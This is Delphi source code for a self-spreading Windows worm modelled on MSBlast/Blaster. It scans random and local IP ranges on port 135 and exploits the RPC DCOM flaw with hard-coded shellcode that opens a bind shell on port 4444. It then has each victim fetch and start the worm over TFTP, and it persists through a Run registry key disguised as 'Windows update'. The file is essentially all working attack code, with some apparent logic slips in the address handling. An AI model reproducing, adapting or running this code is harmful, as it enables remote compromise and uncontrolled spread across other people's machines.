   PROGRAM RPC;

   USES
     WinInet, WinSock, Windows, ACLUtils;

   CONST
     TFTP_PORT_69    = 69;
     MSRCP_PORT_135  = 135;
     SHELL_PORT_4444 = 4444;

   VAR
     FileName         : STRING = 'kernelx.exe';
     Is_TFTP_Running  : Boolean;
     FD_TFTP_Service  : Integer;
     ClassA           : Integer;
     ClassB           : Integer;
     ClassC           : Integer;
     ClassD           : Integer;
     Local_Class_A    : Integer;
     Local_Class_B    : Integer;
     WinXP_Or_Win2k2  : Integer;
     TargetIPString   : pAnsiChar;
     MsBlast_FileName : PAnsiChar;

   PROCEDURE Blaster_TFTP_Thread;
   LABEL CloseSocket_And_Exit;
   VAR
     FP            : FILE;
     Block_ID      : WORD;
     SizeOf_Client : Integer;
     FD            : Integer;
     Block_Size    : Integer;
     Server        : TSockAddrIn;
     Client        : TSockAddrIn;
     RspBuf        : ARRAY[0..511] OF BYTE;
     ReqBuf        : ARRAY[0..511] OF BYTE;
   BEGIN
     Is_TFTP_Running:=True;
     FD:=Socket(AF_INET,SOCK_DGRAM,0);
     IF FD=SOCKET_ERROR THEN GOTO CloseSocket_And_Exit;
     ZeroMemory(@Server,SizeOf(Server));
     Server.sin_family:=AF_INET;
     Server.sin_port:=htons(TFTP_PORT_69);
     Server.sin_addr.S_addr:=0;
     IF Bind(FD,Server,SizeOf(Server))<>0 THEN GOTO CloseSocket_And_Exit;
     SizeOf_Client:=SizeOf(Client);
     IF RecVFrom(FD,ReqBuf,SizeOf(ReqBuf),0,Client,SizeOf_Client)<=0 THEN GOTO CloseSocket_And_Exit;
     Block_ID:=0;
     AssignFile(FP,MSBlast_FileName);
     FileMode:=0;
     {$I-}
     Reset(FP,1);
     IF IOResult<>0 THEN Exit;
     WHILE TRUE DO BEGIN
       Inc(Block_Id);
       RspBuf[0]:=Lo(htons(3));
       RspBuf[1]:=Hi(htons(3));
       RspBuf[2]:=Lo(HTONS(Block_ID));
       RspBuf[3]:=Hi(htons(Block_ID));
       BlockRead(FP,RspBuf[4],512-4,Block_Size);
   //    Inc(Block_Size,4);
       IF SendTo(FD,RspBuf,Block_Size,0,Client,SizeOf_Client)<=0 THEN Break;
       Sleep(900);
       IF Block_Size<>SizeOf(RspBuf) THEN BEGIN
         CloseFile(FP);
         {$I+}
         Break;
       END;
     CloseFile(FP);
     {$I+}
     END;
     CloseSocket_And_Exit:
     Is_TFTP_Running:=False;
     CloseSocket(fd);
     ExitThread(0);
   END;

   PROCEDURE Blaster_Exploit_Target(Sock:Integer;VictimIP:pChar);
   LABEL
     CloseSocket_And_Return;
   CONST
     BindStr : ARRAY[0..71] OF BYTE =(
       $05,$00,$0B,$03,$10,$00,$00,$00,$48,$00,$00,$00,$7F,$00,$00,$00,
       $D0,$16,$D0,$16,$00,$00,$00,$00,$01,$00,$00,$00,$01,$00,$01,$00,
       $a0,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,$46,
       $00,$00,$00,$00,$04,$5D,$88,$8A,$EB,$1C,$C9,$11,$9F,$E8,$08,$00,
       $2B,$10,$48,$60,$02,$00,$00,$00);
     Request1 : ARRAY[1..864] OF BYTE =(
       $05,$00,$00,$03,$10,$00,$00,$00,$E8,$03,$00,$00,$E5,$00,$00,$00,
       $D0,$03,$00,$00,$01,$00,$04,$00,$05,$00,$06,$00,$01,$00,$00,$00,
       $00,$00,$00,$00,$32,$24,$58,$FD,$CC,$45,$64,$49,$B0,$70,$DD,$AE,
       $74,$2C,$96,$D2,$60,$5E,$0D,$00,$01,$00,$00,$00,$00,$00,$00,$00,
       $70,$5E,$0D,$00,$02,$00,$00,$00,$7C,$5E,$0D,$00,$00,$00,$00,$00,
       $10,$00,$00,$00,$80,$96,$F1,$F1,$2A,$4D,$CE,$11,$A6,$6A,$00,$20,
       $AF,$6E,$72,$F4,$0C,$00,$00,$00,$4D,$41,$52,$42,$01,$00,$00,$00,
       $00,$00,$00,$00,$0D,$F0,$AD,$BA,$00,$00,$00,$00,$A8,$F4,$0B,$00,
       $60,$03,$00,$00,$60,$03,$00,$00,$4D,$45,$4F,$57,$04,$00,$00,$00,
       $A2,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,$46,
       $38,$03,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,$46,
       $00,$00,$00,$00,$30,$03,$00,$00,$28,$03,$00,$00,$00,$00,$00,$00,
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$C8,$00,$00,$00,$4D,$45,$4F,$57,
       $28,$03,$00,$00,$D8,$00,$00,$00,$00,$00,$00,$00,$02,$00,$00,$00,
       $07,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$C4,$28,$CD,$00,$64,$29,$CD,$00,$00,$00,$00,$00,
       $07,$00,$00,$00,$B9,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$AB,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$A5,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$A6,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$A4,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$AD,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$AA,$01,$00,$00,$00,$00,$00,$00,$C0,$00,$00,$00,
       $00,$00,$00,$46,$07,$00,$00,$00,$60,$00,$00,$00,$58,$00,$00,$00,
       $90,$00,$00,$00,$40,$00,$00,$00,$20,$00,$00,$00,$78,$00,$00,$00,
       $30,$00,$00,$00,$01,$00,$00,$00,$01,$10,$08,$00,$CC,$CC,$CC,$CC,
       $50,$00,$00,$00,$4F,$B6,$88,$20,$FF,$FF,$FF,$FF,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$01,$10,$08,$00,$CC,$CC,$CC,$CC,
       $48,$00,$00,$00,$07,$00,$66,$00,$06,$09,$02,$00,$00,$00,$00,$00,
       $C0,$00,$00,$00,$00,$00,$00,$46,$10,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$78,$19,$0C,$00,
       $58,$00,$00,$00,$05,$00,$06,$00,$01,$00,$00,$00,$70,$D8,$98,$93,
       $98,$4F,$D2,$11,$A9,$3D,$BE,$57,$B2,$00,$00,$00,$32,$00,$31,$00,
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$80,$00,$00,$00,$0D,$F0,$AD,$BA,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $18,$43,$14,$00,$00,$00,$00,$00,$60,$00,$00,$00,$60,$00,$00,$00,
       $4D,$45,$4F,$57,$04,$00,$00,$00,$C0,$01,$00,$00,$00,$00,$00,$00,
       $C0,$00,$00,$00,$00,$00,$00,$46,$3B,$03,$00,$00,$00,$00,$00,$00,
       $C0,$00,$00,$00,$00,$00,$00,$46,$00,$00,$00,$00,$30,$00,$00,$00,
       $01,$00,$01,$00,$81,$C5,$17,$03,$80,$0E,$E9,$4A,$99,$99,$F1,$8A,
       $50,$6F,$7A,$85,$02,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$30,$00,$00,$00,$78,$00,$6E,$00,
       $00,$00,$00,$00,$D8,$DA,$0D,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $20,$2F,$0C,$00,$00,$00,$00,$00,$00,$00,$00,$00,$03,$00,$00,$00,
       $00,$00,$00,$00,$03,$00,$00,$00,$46,$00,$58,$00,$00,$00,$00,$00,
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$10,$00,$00,$00,$30,$00,$2E,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$68,$00,$00,$00,$0E,$00,$FF,$FF,
       $68,$8B,$0B,$00,$02,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00);

     Request2 : ARRAY[0..15] OF BYTE = (
       $20,$00,$00,$00,$00,$00,$00,$00,$20,$00,$00,$00,$5C,$00,$5C,$00);

     Request3 : ARRAY[0..59] OF BYTE = (
       $5C,$00,$43,$00,$24,$00,$5C,$00,$31,$00,$32,$00,$33,$00,$34,$00,
       $35,$00,$36,$00,$31,$00,$31,$00,$31,$00,$31,$00,$31,$00,$31,$00,
       $31,$00,$31,$00,$31,$00,$31,$00,$31,$00,$31,$00,$31,$00,$31,$00,
       $31,$00,$2E,$00,$64,$00,$6F,$00,$63,$00,$00,$00);

     SC : pChar =
       #$46#$00#$58#$00#$4E#$00#$42#$00#$46#$00#$58#$00#$46#$00#$58#$00+
       #$4E#$00#$42#$00#$46#$00#$58#$00#$46#$00#$58#$00#$46#$00#$58#$00+
       #$46#$00#$58#$00+
       #$ff#$ff#$ff#$ff+ // return address
       #$cc#$e0#$fd#$7f+ // primary thread data block
       #$cc#$e0#$fd#$7f+ // primary thread data block
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+ // port 4444 bindshell
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
       #$90#$90#$90#$90#$90#$90#$90#$eb#$19#$5e#$31#$c9#$81#$e9#$89#$ff+
       #$ff#$ff#$81#$36#$80#$bf#$32#$94#$81#$ee#$fc#$ff#$ff#$ff#$e2#$f2+
       #$eb#$05#$e8#$e2#$ff#$ff#$ff#$03#$53#$06#$1f#$74#$57#$75#$95#$80+
       #$bf#$bb#$92#$7f#$89#$5a#$1a#$ce#$b1#$de#$7c#$e1#$be#$32#$94#$09+
       #$f9#$3a#$6b#$b6#$d7#$9f#$4d#$85#$71#$da#$c6#$81#$bf#$32#$1d#$c6+
       #$b3#$5a#$f8#$ec#$bf#$32#$fc#$b3#$8d#$1c#$f0#$e8#$c8#$41#$a6#$df+
       #$eb#$cd#$c2#$88#$36#$74#$90#$7f#$89#$5a#$e6#$7e#$0c#$24#$7c#$ad+
       #$be#$32#$94#$09#$f9#$22#$6b#$b6#$d7#$4c#$4c#$62#$cc#$da#$8a#$81+
       #$bf#$32#$1d#$c6#$ab#$cd#$e2#$84#$d7#$f9#$79#$7c#$84#$da#$9a#$81+
       #$bf#$32#$1d#$c6#$a7#$cd#$e2#$84#$d7#$eb#$9d#$75#$12#$da#$6a#$80+
       #$bf#$32#$1d#$c6#$a3#$cd#$e2#$84#$d7#$96#$8e#$f0#$78#$da#$7a#$80+
       #$bf#$32#$1d#$c6#$9f#$cd#$e2#$84#$d7#$96#$39#$ae#$56#$da#$4a#$80+
       #$bf#$32#$1d#$c6#$9b#$cd#$e2#$84#$d7#$d7#$dd#$06#$f6#$da#$5a#$80+
       #$bf#$32#$1d#$c6#$97#$cd#$e2#$84#$d7#$d5#$ed#$46#$c6#$da#$2a#$80+
       #$bf#$32#$1d#$c6#$93#$01#$6b#$01#$53#$a2#$95#$80#$bf#$66#$fc#$81+
       #$be#$32#$94#$7f#$e9#$2a#$c4#$d0#$ef#$62#$d4#$d0#$ff#$62#$6b#$d6+
       #$a3#$b9#$4c#$d7#$e8#$5a#$96#$80#$ae#$6e#$1f#$4c#$d5#$24#$c5#$d3+
       #$40#$64#$b4#$d7#$ec#$cd#$c2#$a4#$e8#$63#$c7#$7f#$e9#$1a#$1f#$50+
       #$d7#$57#$ec#$e5#$bf#$5a#$f7#$ed#$db#$1c#$1d#$e6#$8f#$b1#$78#$d4+
       #$32#$0e#$b0#$b3#$7f#$01#$5d#$03#$7e#$27#$3f#$62#$42#$f4#$d0#$a4+
       #$af#$76#$6a#$c4#$9b#$0f#$1d#$d4#$9b#$7a#$1d#$d4#$9b#$7e#$1d#$d4+
       #$9b#$62#$19#$c4#$9b#$22#$c0#$d0#$ee#$63#$c5#$ea#$be#$63#$c5#$7f+
       #$c9#$02#$c5#$7f#$e9#$22#$1f#$4c#$d5#$cd#$6b#$b1#$40#$64#$98#$0b+
       #$77#$65#$6b#$d6#$93#$cd#$c2#$94#$ea#$64#$f0#$21#$8f#$32#$94#$80+
       #$3a#$f2#$ec#$8c#$34#$72#$98#$0b#$cf#$2e#$39#$0b#$d7#$3a#$7f#$89+
       #$34#$72#$a0#$0b#$17#$8a#$94#$80#$bf#$b9#$51#$de#$e2#$f0#$90#$80+
       #$ec#$67#$c2#$d7#$34#$5e#$b0#$98#$34#$77#$a8#$0b#$eb#$37#$ec#$83+
       #$6a#$b9#$de#$98#$34#$68#$b4#$83#$62#$d1#$a6#$c9#$34#$06#$1f#$83+
       #$4a#$01#$6b#$7c#$8c#$f2#$38#$ba#$7b#$46#$93#$41#$70#$3f#$97#$78+
       #$54#$c0#$af#$fc#$9b#$26#$e1#$61#$34#$68#$b0#$83#$62#$54#$1f#$8c+
       #$f4#$b9#$ce#$9c#$bc#$ef#$1f#$84#$34#$31#$51#$6b#$bd#$01#$54#$0b+
       #$6a#$6d#$ca#$dd#$e4#$f0#$90#$80#$2f#$a2#$04;

     Request4 : ARRAY [0..47] OF BYTE =(
       $01,$10,$08,$00,$CC,$CC,$CC,$CC,$20,$00,$00,$00,$30,$00,$2D,$00,
       $00,$00,$00,$00,$88,$2A,$0C,$00,$02,$00,$00,$00,$01,$00,$00,$00,
       $28,$8C,$0C,$00,$01,$00,$00,$00,$07,$00,$00,$00,$00,$00,$00,$00);

   VAR
     Cmdstr    : pChar;
     I         : Integer;
     FD        : Integer;
     Len1      : Integer;
     SizeOf_SA : Integer;
     Ret       : Integer;
     Opt       : Integer;
     ThreadId  : Cardinal;
     hThread   : Cardinal;
     Target_IP : TSockAddrIn;
     SA        : TSockAddrIn;
     Buf2      : ARRAY [0..4095] OF BYTE;
   BEGIN
     Opt:=0;
     IOCtlSocket(Sock,FIONBIO,Opt);
     IF WinXP_Or_Win2k2=1 THEN Ret:=$100139d ELSE Ret:=$18759f;
     Move(Ret,SC[36],4);

     Move(Request1,Buf2,SizeOf(Request1));
     Len1:=SizeOf(Request1);

     Request2[0]:=Request2[0]+Request2[SizeOf(SC) DIV 2];
     Request2[8]:=Request2[8]+Request2[8+SizeOf(SC) DIV 2];

     Move(Request2,Buf2[Len1],SizeOf(Request2));
     Len1:=Len1+SizeOf(Request2);
     Move(SC,Buf2[Len1],SizeOf(SC));
     Len1:=Len1+SizeOf(SC);
     Move(Request3,Buf2[Len1],SizeOf(Request3));
     Len1:=Len1+SizeOf(Request3);
     Move(Request4,Buf2[Len1],SizeOf(Request4));
     Len1:=Len1+SizeOf(Request4);

     Buf2[8]:=Buf2[8]+SizeOf(SC)-$0c;

     Buf2[$10]:=Buf2[$10]+SizeOf(SC)-$0c;
     Buf2[$80]:=Buf2[$80]+SizeOf(SC)-$0c;
     Buf2[$84]:=Buf2[$84]+SizeOf(SC)-$0c;
     Buf2[$b4]:=Buf2[$b4]+SizeOf(SC)-$0c;
     Buf2[$b8]:=Buf2[$b8]+SizeOf(SC)-$0c;
     Buf2[$d0]:=Buf2[$d0]+SizeOf(SC)-$0c;
     Buf2[$18c]:=Buf2[$18c]+SizeOf(SC)-$0c;

     IF Send(Sock,Bindstr,SizeOf(BindStr),0)=-1 THEN Exit;
     IF Send(Sock,Buf2,Len1,0)=-1 THEN Exit;

     CloseSocket(Sock);
     Sleep(400);

     FD:=Socket(AF_INET,SOCK_STREAM,0);
     IF FD=-1 THEN Exit;
     ZeromMemory(@Target_IP,SizeOf(Target_IP));
     Target_ip.sin_family:=AF_INET;
     Target_ip.sin_port:=htons(SHELL_PORT_4444);
     Target_ip.sin_addr.s_addr:=inet_addr(VictimIP);
     IF Target_ip.sin_addr.S_addr=SOCKET_ERROR THEN Exit;
     IF Connect(FD,Target_IP,SizeOf(Target_IP))=SOCKET_ERROR THEN Exit;

     Zeromemory(@TargetIPString,SizeOf(TargetIPString));
     SizeOf_SA:=SizeOf(SA);
     GetSockName(FD,SA,SizeOf_SA);

     TargetIPString:=pChar(IntToStr(Ord(sa.sin_addr.S_un_b.s_b1))+'.'+
                             IntToStr(Ord(sa.sin_addr.S_un_b.s_b2))+'.'+
                             IntToStr(Ord(sa.sin_addr.S_un_b.s_b3))+'.'+
                             IntToStr(Ord(sa.sin_addr.S_un_b.s_b4)));

     IF FD_TFTP_Service>0 THEN CloseSocket(FD_TFTP_Service);
     hThread:=CreateThread(0,0,@Blaster_TFTP_Thread,0,0,ThreadId);

     CmdStr:=pChar('tftp -i '+TargetIPString+' GET '+FileName+#13#10);
     IF Send(FD,CmdStr,StrLen(CmdStr),0)<=0 THEN GOTO CloseSocket_And_Return;
     Sleep(1000);
     FOR I:=0 TO 25 DO BEGIN
       IF Is_TFTP_Running THEN Sleep(2000) ELSE Break;
     END;

     CmdStr:=pChar('start '+FileName+#13#10);
     IF Send(FD,CmdStr,StrLen(CmdStr),0)<=0 THEN GOTO CloseSocket_And_Return;
     Sleep(2000);
     CmdStr:=pChar(FileName+#13#10);
     Send(FD,CmdStr,StrLen(CmdStr),0);
     Sleep(2000);

     CloseSocket_And_Return:

     IF FD<>0 THEN CloseSocket(FD);

     IF Is_TFTP_Running THEN BEGIN
       TerminateThread(hThread,0);
       CloseSocket(FD_TFTP_Service);
       IS_TFTP_Running:=False;
     END;

     CloseHandle(hThread);
   END;

   PROCEDURE Blaster_Increment_IP_Address;
   BEGIN
     WHILE TRUE DO BEGIN
       IF ClassD<=254 THEN BEGIN
         Inc(ClassD);
         Exit;
       END;
       ClassD:=0;
       Inc(ClassC);
       IF ClassC<=254 THEN Exit;
       ClassC:=0;
       Inc(ClassB);
       IF ClassB<=254 THEN EXIT;
       ClassB:=0;
       Inc(ClassA);
       IF ClassA<=254 THEN Continue;
       ClassA:=0;
       Exit;
    END;
   END;

   PROCEDURE Blaster_Spreader;
   VAR
     I           : BYTE;
     VictimIP    : pChar;
     S           : pChar;
     WriteFDS    : TFDSet;
     SizeOf_Peer : Integer;
     Opt         : Integer;
     IP          : Integer;
     TimeOut     : TimeVal;
     NFDS        : Integer;
     Sin         : TSockAddrIn;
     Peer        : TSockAddrIn;
     SockArray   : ARRAY[0..19] OF Integer;
   BEGIN
     Opt:=1;
     ZeroMemory(@sin,SizeOf(sin));
     sin.sin_family:=AF_INET;
     sin.sin_port:=htons(MSRCP_PORT_135);

     FOR I:=0 TO 19 DO BEGIN
       SockArray[I]:=Socket(AF_INET,SOCK_STREAM,0);
       IF SockArray[I]=-1 THEN Exit;
       IOCtlSocket(SockArray[i],FIONBIO,Opt);
     END;

     FOR I:=0 TO 19 DO BEGIN
       Blaster_Increment_IP_Address;
       TargetIPString:=pChar(IntToStr(ClassA)+'.'+IntToStr(ClassB)+'.'+IntToStr(ClassC)+'.'+IntToStr(ClassD));
       IP:=inet_addr(TargetIPString);
       IF IP=-1 THEN Exit;
       sin.sin_addr.S_addr:=ip;
       Connect(SockArray[i],sin,SizeOf(sin));
   //  writeln(TargetIPString);

     END;
     Sleep(1800);
     FOR I:=0 TO 19 DO BEGIN
       Timeout.tv_sec:=0;
       Timeout.tv_usec:=0;
       NFDS:=0;
       FD_ZERO(WriteFDS);
       FD_SET(SockArray[I],WriteFDS);

       IF Select(0,NIL,@writefds,NIL,@TimeOut)<>1 THEN CloseSocket(SockArray[I]) ELSE BEGIN
         SizeOf_Peer:=SizeOf(Peer);
         getpeername(SockArray[I],Peer,SizeOf_Peer);
         VictimIP:=inet_ntoa(Peer.sin_addr);
         Blaster_Exploit_Target(SockArray[I],VictimIP);
         CloseSocket(SockArray[I]);
       END;
     END;
   END;

   PROCEDURE Main;
   VAR
     hkey_       : HKEY;
     p_addr_item : pChar;
     ThreadId    : Integer;
     Scan_Local  : Boolean;
     In_Addr     : TInAddr;
     HostEnt     : pHostEnt;
     F           : STRING;
     WSAData     : TWSAData;
     MyHostName  : pAnsiChar;
   BEGIN
     Scan_Local:=False;
     RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                    'software\microsoft\windows\currentversion\run',
                    0,
                    NIL,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    NIL,
                    hkey_,
                    0);
     RegSetValueExA(hKey_,
                    'Windows update',
                    0,
                    REG_SZ,
                    @FileName,
                    50);
     RegCloseKey(hkey_);
     CreateMutexA(NIL,True,'Platinum');
     IF GetLastError()=ERROR_ALREADY_EXISTS THEN ExitProcess(0);
     IF WSAStartup(MakeWord(2,2),WSAData)<>0 THEN Exit;
     GetMem(MSBlast_FileName,256+4);
     GetModuleFileNameA(0,MSBlast_FileName,SizeOf(MSBlast_FileName));
     WHILE NOT InternetGetConnectedState(@ThreadID,0) DO Sleep(20000);
     ClassD:=0;
     Randomize;
     Local_Class_A:=Random(254)+1;
     Local_Class_A:=Random(254)+1;
     GetMem(MyHostName,512);
     IF GetHostName(MyHostName,SizeOf(MyHostName))<>-1 THEN BEGIN
       HostEnt:=GetHostByName(MyHostName);
       IF(HostEnt<>NIL)AND(HostEnt.h_addr<>NIL) THEN BEGIN
         Move(HostEnt.h_addr,in_addr,SizeOf(in_addr));
         MyHostName:=inet_ntoa(in_addr);
         F:=MyHostName;
         ClassA:=StrToInt(Copy(F,1,Pos('.',F)-1));
         Delete(F,1,Pos('.',F));
         ClassB:=StrToInt(Copy(F,1,Pos('.',F)-1));
         Delete(F,1,Pos('.',F));
         ClassB:=StrToInt(Copy(F,1,Length(F)));
         IF ClassC>20 THEN ClassC:=ClassC-Random(20);
         Local_Class_A:=ClassA;
         Local_Class_A:=ClassB;
         Scan_Local:=True;
       END;
     END;
     IF Random(20)<12 THEN Scan_Local:=False;
     WinXP_Or_Win2k2:=1;
     IF Random(10)>7 THEN WinXP_Or_Win2k2:=2;
     IF NOT Scan_Local THEN BEGIN
       ClassA:=Random(254)+1;
       ClassB:=Random(254)+1;
       ClassC:=Random(254)+1;
     END;
     WHILE TRUE DO Blaster_Spreader;
   END;

   BEGIN
     Main;
   END.
